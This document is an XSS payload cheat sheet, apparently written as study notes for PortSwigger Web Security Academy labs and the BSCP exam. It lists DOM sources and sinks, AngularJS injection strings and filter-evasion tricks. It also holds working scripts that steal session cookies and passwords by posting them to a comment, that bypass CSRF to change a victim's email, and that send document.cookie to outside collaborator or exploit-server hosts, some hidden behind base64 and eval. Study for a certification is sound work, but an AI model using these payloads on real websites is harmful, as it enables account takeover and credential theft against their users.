
## General how-to find XSS
### DOM-based
- Sources:
  - document.URLUnencoded
  - document.baseURI
  - location
  - document.cookie
  - document.referrer
  - window.name
  - history.PushState
  - history.replaceState
  - localStorage
  - IndexedDB
  - Database
- Sinks:
  - document.write()
  - window.location()
  - document.cookie
  - eval()
  - document.domain
  - WebSocket()
  - element.src
  - postMessage()
  - setRequestHeader()
  - FileReader.reafAsText()
  - ExecuteSql()
  - sessionStorage.setItem()
  - document.evaluate()
  - JSON.parse()
  - element.setAttribute()
  - RegExp()
### Polyglots
```html
<>\'\"<script>{{7*7}}$(alert(1)}trevor
```
### Angular
CSTI

```html
{{constructor.constructor('alert(document.cookie)')()}}
```
### Template literals
```html
${alert(1)}
```
### JS
- it is possible to end current script tag:
```html 
</script><script>alert(1)</script>
```
- parentheses are blocker:
```html 
onerror=alert; throw 1
```
- escape string:
```html
'-alert(1)-'
';alert(1)//
\';alert(10//
&apos;alert(1);//
```
### HTML
- it is possible to create new HTML element:
```html
<script>alert(1)</script>
<img src onerror=alert(1)>
"><script>alert(1)</script>
"><svg onload=alert(1)>
```
- custom tag:
```html
<xss id=x tabindex=1 onfocus=alert(1)></xss>
```
- svg:
  - events are blocked (requires user interaction):
```html
<svg width="300" height="200"><a><animate attributeName="onclick" values="javascript:console.log(1)"></animate><text 
x=150 y=100 text-anchor="middle">Click me</text></a></svg>
```
- svg:
  - no user interaction:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
- it is possible to use current element to trigger JS?
```html
" autofocus onfocus=alert(1) x="
href="javascript:alert(1)"
accesskey='X' onclick='alert(1)'
```
### Delivery
- event is required
```html
<iframe src="PAYLOAD">
```
- event is not required:
```html
<script>
location='URL'
</script>
```

## LAB payloads
```html
<script>alert(1)</script>
'"><script>alert(1)</script>
"><svg onload=alert(1)>
\"-alert('XSS')}// - or +, /, * instead of minus
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
\'-alert(document.domain)-//
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
http://foo?&apos;-alert(1)-&apos;
`%26lt%3b/script%26gt%3b%26lt%3bscript%26gt%3b`${alert(document.domain)}`%26lt%3b/script%26gt%3b - url encoded html 
encoded payload `</script><script>`${alert(document.domain)}`</script>
{alert(1)}
```
**CSP bypass**
```html
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```
**document.write + location.search**
```html
product?productId=1&storeId="</select><img%20src=1%20onerror=alert(1)>"
```
**innerHTML + location.search**
```html
?search=%3C/span%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```
**jQuery and DOM-XSS**
```html
javascript:alert(1)
javascript:alert(document.cookie)
<iframe src="https://SOME-ID.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print(1)>'"> - hashchange event
funcs to check:
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```
**AngularJS + angle brackets and double quotes HTML-encoded**
```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```
**angle brackets HTML-encoded, href attr with " html-encoded**
```html
" autofocus onfocus=alert(document.domain) x="
"onmouseover="alert(1)
POST /post/comment HTTP/2
…

csrf=…&…&website=javascript:alert(1)
```
**html.replace**
```html
If you see html.replace() func - it will only replace the first occurrence
</p><img src=1 onerror=alert(1)>
<><img src=1 onerror=alert(1)>

<h3>DOM-XSS vulns sinks</h3>
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
**Get session cookie**
```html
<script>
window.addEventListener("DOMContentLoaded", function() {var data = new FormData(); data.append("csrf", document.getElementsByName("csrf")[0].value); data.append("postId", 1); data.append("comment", document.cookie); data.append("name", "target"); data.append("email", "t@t.com"); fetch("/post/comment", {method: "POST", body: data}); });
</script> - using comment field
```

**Get password**
```html
<label>Username</label>
<input required type="text" name="username" id="username" autofocus>
<label>Password</label>
<input required type="password" name="password" id="password" onchange='if (this.value.length) { 
    var data = new FormData(); 
    data.append("csrf", document.getElementsByName("csrf")[0].value); 
    data.append("postId", 7); 
    data.append("comment", document.getElementById("username").value + ":" + this.value); 
    data.append("name", "target"); 
    data.append("email", "t@t.com"); 
    fetch("/post/comment", { method: "POST", body: data }); 
}'>
<button class="button" type="submit">Log in</button>
```
**Bypass CSRF defense**
```html
<img src=1 onerror='if (true) { 
    var data = new FormData(); 
    data.append("csrf", document.getElementsByName("csrf")[0].value); 
    data.append("email", "changed@email.com"); 
    fetch("/my-account/change-email", { method: "POST", body: data }); 
}'>
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
**HTML context with most tags and attributes blocked**
```html
GET /?search=<§script§> HTTP/2 - get all tags from XSS cheatsheet and brute them
GET /?search=<bruted_tag+§attr§=''> HTTP/2 - repeat for attributes
%3Cbody+contenteditable+onbeforeinput%3Dprint%28%29%3Etest
<body contenteditable onbeforeinput=print()>test
<iframe src="https://...web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.
width='200px'>
```
**HTML context with all tags blocked except custom ones**
```html
create on flight custom tag
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
**href blocked**
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click me</text></a></svg>
```
**some svg allowed**
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
**canonical link tags**
```html
%27accesskey=%27x%27onclick=%27alert(1)%27x=%27
```
## Practice exams payloads</h2>
```html
\\"-alert('XSS')}//
\\"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))}//

after search term url encode + base64 for atob and encode for quotes
<script>
window.location.replace("https://...web-security-academy.net/?SearchTerm=\\"-eval(atob("document.
location='https://exploit-...exploit-server.net/random?c='+document.cookie"))}//'");
</script>

alert`1`
\\"-alert`1`}//
"-eval`${document.location="https://exploit-...exploit-server.net/random?c="+document.cookie}`-"

<script>
document.location="https://...web-security-academy.net/?find="-eval`${document.
location='https://exploit-...exploit-server.net/random?c='+document.cookie}`-""
</script> - but "" will ruin everything, so encode second part inside find=
```
Some payloads from wr3dmast3r article about [BSCP certification](https://habr.com/en/companies/jetinfosystems/articles/805297/).

```html
"-prompt(1)-"
"-alert(1)-"
"-alert(window["document"]["cookie"])-" 
"-window["alert"](window["document"]["cookie"])-" 
"-self["alert"](self["document"]["cookie"])-"
fetch(`https://COLLAB/?xss=` + window["document"]["cookie"]) // send to your server
"-eval(atob("fetch(`https://collaborator/?xss=` + window["document"]["cookie"])"))-" // base64 encode
"-eval(atob("ZmV0Y2goYGh0dHBzOi8vY29sbGFib3JhdG9yLz94c3M9YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))-"
<script>
document.location = "https://...web-security-academy.net/?SearchTerm=%22-eval%28atob%28%22fetch
(`https://collaborator/?xss=`+window["document"]["cookie"])%22%29%29-%22"
</script> // don't forget to encode in base64

\\"-alert`1`}//
\\"-prompt`${document.cookie}`}// - might not work
\\"-setTimeout`alert\x28document.cookie\x29`}//
\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//
<script>
document.location="https://...web-security-academy.net/?find=\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//"
</script> // don't forget to URL-encode value in find param

```